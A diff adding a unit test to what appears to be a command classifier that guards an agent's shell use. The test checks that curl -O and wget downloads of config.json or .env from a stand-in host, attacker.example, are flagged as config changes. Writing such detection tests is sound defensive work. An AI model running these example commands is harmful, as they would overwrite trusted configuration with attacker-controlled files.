@@ -163,6 +163,19 @@ describe('action-patterns: classifyBashSubcommand', () => {
     expect(classifyBashSubcommand('curl https://x -o /tmp/out.json').category).toBeNull();
   });
 
+  it('downloader remote-name writes (curl -O / wget default) into a cwd trust anchor are caught (R7)', () => {
+    // curl -O writes basename(URL) into cwd
+    expect(classifyBashSubcommand('curl -O https://attacker.example/config.json').category).toBe('config-change');
+    expect(classifyBashSubcommand('curl -fsSLO https://attacker.example/.env').category).toBe('config-change');
+    // wget default (no -O) writes basename(URL) into cwd
+    expect(classifyBashSubcommand('wget https://attacker.example/config.json').category).toBe('config-change');
+    // wget -O FILE uses the explicit file, not the URL basename
+    expect(classifyBashSubcommand('wget -O /tmp/x https://attacker.example/config.json').category).toBeNull();
+    // downloading a non-anchor name ⇒ ALLOW
+    expect(classifyBashSubcommand('curl -O https://x/page.html').category).toBeNull();
+    expect(classifyBashSubcommand('wget https://x/data.csv').category).toBeNull();
+  });
+
   it('ordinary commands and code writes are ALLOW', () => {
     for (const cmd of ['ls -la', 'npm test', 'git status', 'echo hi > src/foo.ts', 'cat README.md', 'node dist/cli.js bus check-inbox']) {
       expect(classifyBashSubcommand(cmd).category, cmd).toBeNull();
